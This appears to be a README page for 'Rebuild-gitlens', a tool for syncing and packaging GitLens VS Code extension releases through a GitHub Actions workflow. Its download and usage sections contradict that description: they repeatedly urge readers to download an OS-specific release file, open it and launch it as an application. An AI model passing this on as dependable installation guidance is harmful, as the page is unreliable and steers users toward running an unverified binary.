---
layout: "default"
title: "🎉 Rebuild-gitlens - Easy Sync for GitLens Releases"
description: "🚀 Automate syncing and packaging the latest releases of GitLens, while offering a streamlined build environment with partial localization features."
---
# 🎉 Rebuild-gitlens - Easy Sync for GitLens Releases

[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue.svg)](https://github.com/hicemen/Rebuild-gitlens/releases)

## 🚀 Getting Started

Welcome to **Rebuild-gitlens**! This application helps you sync and package the latest releases of GitLens, an extension for Visual Studio Code. With our tool, you can easily manage updates and take advantage of the latest features.

### 💻 System Requirements

- Windows, macOS, or Linux
- Visual Studio Code installed
- Internet connection for downloading releases

## 📥 Download & Install

To get started, visit our [Releases page](https://github.com/hicemen/Rebuild-gitlens/releases) to download the latest version of Rebuild-gitlens.

### Steps to Download:

1. Click the link above.
2. Locate the latest release.
3. Download the appropriate file for your operating system.
4. Open the downloaded file to start the installation process.

## 🔍 Features

- Specify a version or automatically fetch the latest version
- Check if a corresponding release already exists locally
- Automatically install dependencies and create a `.vsix` package
- Generate a GitHub Release with change logs included

## ⏲️ How It Works

The process of syncing and packaging GitLens is straightforward. Here is what happens:

1. **Version Check**: The tool checks if you provided a version number. If you leave it empty, the latest version is fetched.
2. **Local Check**: It scans your local environment to see if the release already exists. If it does, the tool skips the packaging step.
3. **Fetch Code**: The relevant code is pulled from the upstream repository.
4. **Release Info**: It retrieves release notes from the upstream repository.
5. **Checkout Code**: The tool switches to the specified version of the code.
6. **Install Dependencies**: It runs `pnpm install` to install necessary dependencies.
7. **Package Build**: Finally, the tool builds the project, creating a `.vsix` file ready for installation.

## ⚙️ Manual Triggering

You can also manually trigger the sync process through GitHub Actions. Here’s how:

1. Go to the **Actions** tab in the repository.
2. Select the **Sync Release** workflow.
3. Click **Run workflow**.
4. Optional: Enter a version (e.g., `v17.8.1`). Leave it blank to get the latest.
5. Click **Run workflow** again to execute the process.

## 📝 Input Parameters

| Parameter | Type   | Required | Default   | Description                                                                       |
|-----------|--------|----------|-----------|-----------------------------------------------------------------------------------|
| `version` | string | No       | Latest    | The version number to sync. It should be in semantic versioning format (e.g., `v17.8.1`). Leave blank to fetch the latest version. |

## 🌟 Example Usage

Assume you want to sync version `v17.8.1` of GitLens:

1. Launch the tool.
2. Specify the version as `v17.8.1`.
3. Click sync to start the packaging process.
4. Once completed, you will get a `.vsix` file ready for installation.

## 💬 Conclusion

Rebuild-gitlens simplifies the process of keeping your GitLens extension up to date. By downloading and running this application, you can effortlessly manage your releases. 

Visit our [Releases page](https://github.com/hicemen/Rebuild-gitlens/releases) to download the latest version and start enjoying the benefits of hassle-free syncing.